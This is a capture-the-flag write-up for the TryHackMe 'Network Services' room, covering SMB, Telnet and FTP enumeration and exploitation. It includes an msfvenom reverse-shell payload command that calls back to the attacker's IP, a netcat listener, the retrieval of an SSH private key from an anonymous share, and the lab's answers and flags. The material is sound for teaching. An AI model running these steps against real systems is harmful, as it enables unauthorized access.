# Network Services

> **Platform:** TryHackMe
> **Room:** Network Services
> **Difficulty:** Beginner
> **Status:** ✅ Completed

---

## Overview

The **Network Services** room on TryHackMe introduces common network services and demonstrates how to enumerate and exploit them in a controlled lab environment.

The room focuses on three major services:

* **SMB (Server Message Block)** — used for network file and resource sharing.
* **Telnet** — a remote access protocol that transmits data without encryption.
* **FTP (File Transfer Protocol)** — used to transfer files between clients and servers.

Throughout the room, the methodology followed was:

1. Identify whether the target is reachable.
2. Enumerate open ports and services.
3. Gather information about users, shares, and configurations.
4. Identify potential weaknesses.
5. Exploit the weakness in the lab environment.
6. Retrieve the relevant flags.

---

# Task 1: Get Connected / Introduction

This task covers connecting to the TryHackMe environment and preparing the machine for the following exercises.

No questions were required for this task.

---

# Task 2: SMB

## What is SMB?

**SMB (Server Message Block)** is a network protocol used primarily for file and resource sharing between systems over a network.

SMB follows a **request-response** communication model. A client sends a request to an SMB server, and the server responds with the requested information or performs the requested operation.

SMB commonly operates over the **TCP/IP** protocol suite.

**Samba** is an implementation of SMB that allows Unix and Linux systems to provide SMB-compatible services.

### Questions and Answers

### 1. What does SMB stand for?

```text
Server Message Block
```

### 2. What type of protocol is SMB?

```text
Response-request
```

SMB uses a request-response communication model in which clients request resources or operations from the server.

### 3. What protocol suite do clients use to connect to the server?

```text
TCP/IP
```

### 4. What systems does Samba run on?

```text
Unix
```

Samba provides SMB functionality on Unix-like systems, allowing them to communicate with systems using SMB.

---

# Task 3: Enumerating SMB

## Enumeration

Enumeration is the process of gathering information about a target before attempting exploitation. In this task, the goal was to identify open ports, SMB services, system information, users, shares, and other useful details.

I first started the target machine and used `ping` to check whether the host was reachable.

```bash
ping <IP>
```

After confirming connectivity, I performed a basic Nmap scan:

```bash
nmap <IP>
```

The scan identified **three open TCP ports**. Two of them were SMB-related ports: **139** and **445**.

I then used Enum4Linux to gather more detailed information:

```bash
enum4linux -a <IP>
```

The `-a` option performs a comprehensive basic enumeration and attempts to gather several categories of information, including:

```text
-U    Get userlist
-M    Get machine list
-N    Get namelist dump
-S    Get sharelist
-P    Get password policy information
-G    Get group and member list
```

This enumeration provided the information needed to answer the remaining questions.

## Questions and Answers

### 1. Conduct an Nmap scan of your choosing. How many ports are open?

```text
3
```

The initial Nmap scan identified three open TCP ports on the target.

### 2. What ports is SMB running on? Provide the ports in ascending order.

```text
139/445
```

SMB was available on TCP ports **139** and **445**.

### 3. What is the workgroup name?

```text
WORKGROUP
```

The Enum4Linux enumeration revealed that the SMB workgroup was named `WORKGROUP`.

### 4. What comes up as the name of the machine?

```text
POLOSMB
```

Enum4Linux identified the machine name as `POLOSMB`.

### 5. What operating system version is running?

```text
6.1
```

The enumeration output identified the operating system version as `6.1`.

### 6. What share sticks out as something we might want to investigate?

```text
profiles
```

The `profiles` SMB share stood out as an interesting target because accessible shares can contain files, configuration information, credentials, keys, or other information useful during enumeration.

---

# Task 4: Exploiting SMB

After enumerating the SMB service, the next step was to investigate whether the interesting `profiles` share could be accessed anonymously.

## SMB Client Syntax

The room provides the following example for connecting to an SMB share:

### What would be the correct syntax to access an SMB share called `secret` as user `suit` on a machine with IP `10.10.10.2` on the default port?

```bash
smbclient //10.10.10.2/secret -U suit -p 445
```

The command uses:

* `smbclient` to interact with an SMB server.
* `//10.10.10.2/secret` to specify the target IP and share.
* `-U suit` to specify the username.
* `-p 445` to specify the SMB port.

## Anonymous SMB Access

I connected to the `profiles` share using the anonymous account:

```bash
smbclient //<IP>/profiles -U anonymous -p 445
```

The connection succeeded without requiring a password, confirming that anonymous access was enabled.

Once connected, I used the SMB client commands to inspect the share.

```text
ls
```

The directory listing contained an interesting file:

```text
working from home information.txt
```

I downloaded the file using:

```text
get working from home information.txt
```

The file contained information about the profile owner and the service configured for remote access.

The profile belonged to **John Cactus**, and the configured service was **SSH**.

Because SSH commonly stores authentication-related files inside the user's `.ssh` directory, I investigated that directory and found an SSH private key named:

```text
id_rsa
```

I downloaded the private key and changed its permissions as instructed:

```bash
chmod 600 id_rsa
```

The key could then be used with SSH and the username discovered during enumeration.

## Questions and Answers

### 1. Does the share allow anonymous access?

```text
Y
```

The `profiles` share allowed access using the `anonymous` username without supplying a password.

### 2. Who can we assume this profile folder belongs to?

```text
John Cactus
```

The `working from home information.txt` file identified the owner of the profile.

### 3. What service has been configured to allow him to work from home?

```text
ssh
```

The information file indicated that SSH had been configured for remote access.

### 4. What directory on the share should we look in?

```text
.ssh
```

SSH user configuration and authentication files are commonly stored in the user's `.ssh` directory.

### 5. Which authentication key is most useful to us?

```text
id_rsa
```

`id_rsa` is a common filename for an SSH private key. The key was downloaded from the SMB share and its permissions were changed to `600`:

```bash
chmod 600 id_rsa
```

The discovered username, SSH service, and private key could then be used to authenticate to the target.

### 6. What is the `smb.txt` flag?

```text
THM{smb_is_fun_eh?}
```

After using the discovered SSH credentials and private key to access the machine, the first flag was obtained.

---

# Task 5: Understanding Telnet

## What is Telnet?

**Telnet** is a network service that allows a client to connect to and execute commands on a remote machine.

One of Telnet's major security weaknesses is that it does **not encrypt communication**. Data, including commands and potentially credentials, can therefore be transmitted in plaintext.

Because of this weakness, **SSH** has largely replaced Telnet for secure remote administration.

## Questions and Answers

### 1. Is Telnet a client-server protocol?

```text
Y
```

Telnet uses a client-server model in which a Telnet client connects to a Telnet server.

### 2. What has slowly replaced Telnet?

```text
SSH
```

SSH provides encrypted remote communication and is therefore a much safer alternative to Telnet.

### 3. How would you connect to a Telnet server with IP `10.10.10.3` on port `23`?

```bash
telnet 10.10.10.3 23
```

The command specifies both the target IP address and the Telnet port.

### 4. The lack of what means that all Telnet communication is in plaintext?

```text
Encryption
```

Telnet does not provide encryption for its communication.

---

# Task 6: Enumerating Telnet

The next stage was to enumerate the Telnet service.

I started by running an Nmap scan. A regular Nmap scan initially showed no open ports because the Telnet service was running on a **non-standard port**.

To find services outside the common port range, I performed a scan of all TCP ports:

```bash
nmap -p- <IP>
```

This identified one open port:

```text
8012
```

I then connected to the port using Telnet:

```bash
telnet <IP> 8012
```

The connection displayed the following welcome message:

```text
SKIDY'S BACKDOOR
```

This provided an important clue that the service could potentially be a backdoor and that **SKIDY** might be a relevant username.

## Questions and Answers

### 1. How many ports are open on the lab machine?

```text
1
```

A scan of all TCP ports identified one open port.

### 2. What port is this?

```text
8012
```

The Telnet service was running on port `8012`, rather than the standard Telnet port.

### 3. This port is unassigned, but still lists the protocol it is using. What protocol is this?

The port was associated with Telnet.

### 4. How many ports show up when Nmap is run without the `-p-` tag?

```text
0
```

The standard Nmap scan did not identify the service because it was running on port `8012`, outside the common ports included in Nmap's default top-port scan.

This demonstrates why scanning only common ports can cause services to be missed. During enumeration, scanning the complete port range can reveal services operating on unusual ports.

### 5. Based on the title returned to us, what do we think this port could be used for?

```text
A backdoor
```

The welcome message `SKIDY'S BACKDOOR` strongly suggested that the service could be a backdoor.

### 6. Who could it belong to?

```text
SKIDY
```

The name `SKIDY` appeared in the service's welcome message and provided a possible username to investigate.

---

# Task 7: Exploiting Telnet

After connecting to the Telnet service, I attempted to execute commands directly. The commands did not return visible output.

The next objective was to determine whether commands entered through the Telnet service were actually being executed by the target.

## Testing Command Execution

I started a `tcpdump` listener on my local machine to monitor ICMP traffic.

When using a local machine with the OpenVPN connection:

```bash
sudo tcpdump ip proto \icmp -i tun0
```

When using the TryHackMe AttackBox:

```bash
sudo tcpdump ip proto \icmp -i ens5
```

The listener was configured to capture ICMP packets because the `ping` command uses ICMP.

I then used the Telnet connection to execute a ping command against my local TryHackMe IP:

```text
.RUN ping [local THM IP] -c 1
```

The ICMP packet appeared in the `tcpdump` output.

This confirmed two important things:

1. Commands sent through the Telnet service were being executed by the target.
2. The target could reach my local machine.

## Creating a Reverse Shell

Since arbitrary system commands could be executed, the next step in the lab was to create a reverse shell payload using `msfvenom`.

The room provided the following command:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

The options are:

* `-p` — specifies the payload.
* `lhost` — specifies the local machine's IP address.
* `lport` — specifies the port on the local machine that will receive the connection.
* `R` — outputs the payload in raw format.

The generated payload started with:

```text
mkfifo
```

I then started a Netcat listener on the selected port:

```bash
nc -lvnp 4444
```

The generated payload was executed through the Telnet service. The target then connected back to the listener, providing a shell on the lab machine.

## Questions and Answers

### 1. What welcome message do we receive?

```text
SKIDY'S BACKDOOR
```

The message was displayed immediately after connecting to the Telnet service.

### 2. Do we get a return when executing commands?

```text
N
```

Commands did not produce visible output in the Telnet session.

### 3. Do we receive any pings when testing command execution?

```text
Y
```

The `tcpdump` listener received the ICMP packet generated by the target, confirming that commands were being executed.

### 4. What word does the generated payload start with?

```text
mkfifo
```

The `msfvenom` payload began with `mkfifo`.

### 5. What command should be used for the Netcat listener?

```bash
nc -lvnp 4444
```

This listener waits for the reverse shell connection on port `4444`.

### 6. What is the contents of `flag.txt`?

```text
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

After the reverse shell connection was established, the `flag.txt` file could be accessed on the target.

---

# Task 8: Understanding FTP

## What is FTP?

**FTP (File Transfer Protocol)** is a network protocol designed for transferring files between systems.

FTP uses a **client-server** communication model. An FTP client connects to an FTP server and can perform operations such as listing directories, uploading files, and downloading files, depending on the permissions available.

FTP uses two connection modes:

* **Active mode**
* **Passive mode**

The standard FTP control port is **TCP 21**.

## Questions and Answers

### 1. What communications model does FTP use?

```text
Client-server
```

An FTP client communicates with an FTP server to perform file-transfer operations.

### 2. What's the standard FTP port?

```text
21
```

TCP port `21` is the standard FTP control port.

### 3. How many modes of FTP connection are there?

```text
2
```

FTP supports **active** and **passive** connection modes.

---

# Task 9: FTP Enumeration

I started the target machine and performed an Nmap scan:

```bash
nmap <IP>
```

The scan identified three open ports, including:

```text
21  FTP
22  SSH
80  HTTP
```

The FTP service was running on the standard port `21`.

I then attempted to connect to the FTP server anonymously:

```bash
ftp <IP>
```

When prompted for a username, I used:

```text
anonymous
```

No password was required, confirming that anonymous FTP access was enabled.

After connecting, I listed the available files and found:

```text
PUBLIC_NOTICE.txt
```

I downloaded the file using:

```text
get PUBLIC_NOTICE.txt
```

The file contained a message intended for system administrators. From the information in the file, I identified **mike** as a possible username.

Because a valid username had been identified, the next step in the room was to attempt password discovery using Hydra.

The password discovered for the user was:

```text
password
```

I then logged into the FTP service using the `mike` credentials and listed the available files.

An interesting file named `ftp.txt` was present, so I downloaded it:

```text
get ftp.txt
```

The downloaded file contained the FTP flag.

## Questions and Answers

### 1. How many ports are open on the lab machine?

```text
3
```

The Nmap scan identified three open ports.

### 2. What port is FTP running on?

```text
21
```

FTP was running on its standard control port.

### 3. What variant of FTP is running on it?

```text
vsftpd
```

The Nmap service enumeration identified the FTP server as `vsftpd`.

### 4. What is the name of the file in the anonymous FTP directory?

```text
PUBLIC_NOTICE.txt
```

The file was visible after successfully logging in anonymously.

### 5. What do we think a possible username could be?

```text
mike
```

The username was identified from the contents of `PUBLIC_NOTICE.txt`.

---

# Task 10: Exploiting FTP

After identifying the possible username `mike`, the next step was to determine the password.

The password discovered for the account was:

```text
password
```

I then connected to the FTP server using the discovered credentials:

```bash
ftp <IP>
```

After authenticating as `mike`, I listed the available files and found:

```text
ftp.txt
```

I downloaded the file:

```text
get ftp.txt
```

The contents of the file contained the final FTP flag.

## Questions and Answers

### 1. What is the password for the user `mike`?

```text
password
```

The password was identified during the password-discovery stage of the room.

### 2. What is `ftp.txt`?

```text
THM{y0u_g0t_th3_ftp_fl4g}
```

The `ftp.txt` file contained the FTP flag.

---

# What I Learned

The **Network Services** room provided a practical introduction to network service enumeration and exploitation.

Key lessons from the room include:

* **Enumeration should come before exploitation.** Identifying open ports and services provides the information needed to determine the next step.
* **Nmap is an important enumeration tool.** A basic scan can identify common services, while scanning all ports can reveal services running on non-standard ports.
* **SMB can expose valuable information.** Accessible shares may contain documents, usernames, configuration files, and authentication material.
* **Anonymous access should always be checked.** The SMB and FTP services demonstrated how misconfigured anonymous access can expose sensitive information.
* **Sensitive files should not be exposed through network shares.** The SMB share contained an SSH private key that could be used for authentication.
* **Telnet is insecure because it does not provide encryption.** SSH is a safer alternative for remote administration.
* **Services can run on unexpected ports.** The Telnet service was running on port `8012`, so a standard top-port scan did not initially identify it.
* **A service that does not display command output may still execute commands.** Monitoring ICMP traffic with `tcpdump` provided a way to verify command execution.
* **FTP is primarily designed for file transfer.** Misconfigured anonymous access or weak credentials can expose sensitive files.
* **Information gathered during enumeration is useful later.** Usernames, service versions, share names, filenames, and configuration details can all contribute to successful exploitation.
* **Least privilege and secure configuration are essential.** Anonymous access, exposed private keys, weak credentials, and insecure remote services can significantly increase the attack surface.

---

# Conclusion

The **Network Services** room demonstrated a complete beginner-friendly workflow for working with common network services.

Starting with basic connectivity checks and Nmap enumeration, I identified SMB, Telnet, and FTP services and then investigated each service for potential weaknesses. The exercises demonstrated how anonymous access, exposed authentication keys, non-standard ports, insecure remote services, and weak credentials can lead to unauthorized access.

The biggest takeaway is that **thorough enumeration is often the foundation of successful exploitation**. Understanding what services are running, how they are configured, and what information they expose makes it possible to identify the most promising attack paths.

---

# Room Status

| Platform  | Room             | Difficulty | Status      |
| --------- | ---------------- | ---------- | ----------- |
| TryHackMe | Network Services | Beginner   | ✅ Completed |

---

# Completion Screenshot

![Room Completion](images/completion.png)
